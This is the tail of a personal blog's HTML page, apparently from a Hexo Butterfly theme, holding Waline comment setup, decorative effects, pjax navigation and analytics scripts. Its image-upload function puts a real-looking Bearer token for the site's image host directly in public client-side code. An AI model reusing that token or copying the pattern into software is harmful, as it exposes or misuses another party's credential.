  function insertCSS () {
    const link = document.createElement("link")
    link.rel = "stylesheet"
    link.href = "https://assets.bili33.top/css/waline.css"
    document.head.appendChild(link)
  }

  function initWaline () {
    const waline = Waline.init(Object.assign({
      el: '#waline-wrap',
      serverURL: 'https://waline.bili33.top',
      pageview: false,
      dark: 'html[data-theme="dark"]',
      path: window.location.pathname,
      comment: false,
      imageUploader: (file) => {
        let formData = new FormData();
        let headers = new Headers();
        let query = new URLSearchParams();

        formData.append('file', file);
        headers.append('Authorization', 'Bearer imgbed_YdVn2QPSD7RjaCDYIODMnlyY8wAn3FZD')
        headers.append('User-Agent', 'Paff-Waline/1.0')

        return fetch('https://img.bili33.top/upload', {
          method: 'POST',
          headers: headers,
          body: formData,
        }).then((resp) => resp.json())
        .then((data) => 'https://img.bili33.top' + data[0].src)
      }

    }, {"avatar":"mp","emojiCDN":"https://cdn.bili33.top/gh/GamerNoTitle/ValineCDN@master/","visitor":true,"emoji":["https://cdn.bili33.top/gh/GamerNoTitle/ValineCDN@master/bilibiliHotKey","https://cdn.bili33.top/gh/GamerNoTitle/ValineCDN@master/bilibili2233","https://cdn.bili33.top/gh/GamerNoTitle/ValineCDN@master/bilibilitv","https://cdn.bili33.top/gh/GamerNoTitle/ValineCDN@master/Arcaea","https://cdn.bili33.top/gh/GamerNoTitle/ValineCDN@master/Heybox","https://cdn.bili33.top/gh/GamerNoTitle/ValineCDN@master/Majotabi"],"locale":{"nick":"昵称","nickError":"昵称不能少于3个字符","mail":"邮箱","mailError":"请填写正确的邮件地址","link":"网址","optional":"可选","placeholder":"📌图片上传大小限制 5MB，请友善发言，并遵守相关法律法规。","sofa":"来发评论吧~","submit":"提交","like":"喜欢","cancelLike":"撤销喜欢","reply":"回复","cancelReply":"撤回","comment":"评论","refresh":"刷新","more":"加载更多...","preview":"预览","emoji":"表情","uploadImage":"上传图片","seconds":"秒前","minutes":"分钟前","hours":"小时前","days":"天前","now":"刚刚","uploading":"Uploading","login":"登录","logout":"登出","admin":"Endministrator","sticky":"📌","word":"字","wordHint":"评论字数应在 $0 到 $1 字之间！\\n当前字数：$2","anonymous":"匿名","level0":"Lv0","level1":"Lv1","level2":"Lv2","level3":"Lv3","level4":"Lv4","level5":"Lv5","gif":"表情包","gifSearchPlaceholder":"搜索表情包","profile":"个人资料","approved":"通过","waiting":"待审核","spam":"垃圾","unsticky":"取消置顶","oldest":"倒序","latest":"正序","hottest":"热度","reactionTitle":"你认为这篇文章怎么样？"},"noCopyright":true,"reaction":false}))
  }

  if (typeof Waline === 'function') initWaline()
  else {
    insertCSS()
    getScript('https://assets.bili33.top/js/waline.umd.js').then(initWaline)
  }
}

if ('Waline' === 'Waline' || !true) {
  if (true) btf.loadComment(document.getElementById('waline-wrap'),loadWaline)
  else setTimeout(loadWaline, 0)
} else {
  function loadOtherComment () {
    loadWaline()
  }
}</script></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.bili33.top/npm/butterfly-extsrc@1.1.3/dist/fireworks.min.js"></script><script defer="defer" id="ribbon" src="https://cdn.bili33.top/npm/butterfly-extsrc@1.1.3/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="false" data-click="false"></script><script defer="defer" id="fluttering_ribbon" mobile="false" src="https://cdn.bili33.top/npm/butterfly-extsrc@1.1.3/dist/canvas-fluttering-ribbon.min.js"></script><script src="https://cdn.bili33.top/npm/butterfly-extsrc@1.1.3/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
POWERMODE.shake = false;
POWERMODE.mobile = false;
document.body.addEventListener('input', POWERMODE);
</script><link rel="stylesheet" href="https://cdn.bili33.top/npm/aplayer@1.10.1/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.bili33.top/npm/aplayer@1.10.1/dist/APlayer.min.js"></script><script src="https://cdn.bili33.top/npm/butterfly-extsrc@1.1.3/metingjs/dist/Meting.min.js"></script><script src="https://cdn.bili33.top/npm/pjax@0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]

var pjax = new Pjax({
  elements: 'a:not([target="_blank"])',
  selectors: pjaxSelectors,
  cacheBust: false,
  analytics: true,
  scrollRestoration: false
})

document.addEventListener('pjax:send', function () {

  // removeEventListener scroll 
  window.tocScrollFn && window.removeEventListener('scroll', window.tocScrollFn)
  window.scrollCollect && window.removeEventListener('scroll', scrollCollect)

  document.getElementById('rightside').style.cssText = "opacity: ''; transform: ''"
  
  if (window.aplayers) {
    for (let i = 0; i < window.aplayers.length; i++) {
      if (!window.aplayers[i].options.fixed) {
        window.aplayers[i].destroy()
      }
    }
  }

  typeof typed === 'object' && typed.destroy()

  //reset readmode
  const $bodyClassList = document.body.classList
  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')

  typeof disqusjs === 'object' && disqusjs.destroy()
})

document.addEventListener('pjax:complete', function () {
  window.refreshFn()

  document.querySelectorAll('script[data-pjax]').forEach(item => {
    const newScript = document.createElement('script')
    const content = item.text || item.textContent || item.innerHTML || ""
    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
    newScript.appendChild(document.createTextNode(content))
    item.parentNode.replaceChild(newScript, item)
  })

  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()

  typeof chatBtnFn === 'function' && chatBtnFn()
  typeof panguInit === 'function' && panguInit()

  // google analytics
  typeof gtag === 'function' && gtag('config', 'UA-138072700-2', {'page_path': window.location.pathname});

  // baidu analytics
  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);

  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()

  // prismjs
  typeof Prism === 'object' && Prism.highlightAll()
})

document.addEventListener('pjax:error', (e) => {
  if (e.request.status === 404) {
    pjax.loadUrl('/404.html')
  }
})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>